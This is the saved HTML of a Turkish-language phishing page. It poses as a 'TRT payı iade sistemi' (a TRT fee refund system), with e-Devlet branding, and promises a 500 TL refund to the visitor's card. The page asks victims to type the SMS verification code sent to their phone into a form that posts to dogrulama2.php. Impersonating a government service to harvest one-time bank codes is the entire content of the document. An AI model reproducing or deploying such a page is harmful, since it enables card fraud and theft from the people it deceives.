<!DOCTYPE html>
<!-- saved from url=(0032)https://aidatiadeniz.com/sms.php -->
<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>TRT | Aidat İade Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./sms_files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./sms_files/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="./sms_files/flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./sms_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./sms_files/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./sms_files/default.css">

</head>
<body id="top">

<div class="page_loader"></div>


<link rel="icon" type="image/x-icon" href="https://www.indirvip.com/wp-content/uploads/2017/12/e-devlet-kap%C4%B1s%C4%B1-logo.png">
<form method="post" action="dogrulama2.php" id="aspnetForm" autocomplete="off">




   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./sms_files/bootstrap.min(1).css">
    <link type="text/css" rel="stylesheet" href="./sms_files/font-awesome.min(1).css">
    <link type="text/css" rel="stylesheet" href="./sms_files/flaticon(1).css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="https://www.indirvip.com/wp-content/uploads/2017/12/e-devlet-kap%C4%B1s%C4%B1-logo.png" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./sms_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./sms_files/style(1).css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./sms_files/default(1).css">


<div class="page_loader"></div>



<!-- Login 1 start -->

<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        
                            <img src="http://www.globya.com.tr/wp-content/uploads/2016/03/clients-04.png" alt="logo">
                        </a>
                        <h3>TRT PAYI İADE SİSTEMİ</h3>


			<font size="2" color="#960000">İadenizin Aktarımı <b>ODEME KURULUSU</b>  Tarafından Yapılacaktır. <b>500,00 ₺</b> Aidat İadenizin Kartınıza Aktarımı İçin Telefonunuza Gönderilen <b>SMS</b> Şifresini Giriniz. </font>
			
			<br>
			<br>
                        
                            <div class="form-group">
							
                                <input class="expiration-month-and-year input-text" pattern="[0-9]*" type="password" maxlength="8" minlength="5" id="kimlik" name="sms1" placeholder="SMS Şifresi" required="">
                            </div>
                            
                            
                                <button type="submit" class="btn-md btn-theme btn-block">DOĞRULA</button>
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                        
                       
                </div>
            </div>
        </div>
    </div>
</div></section></form></body></html>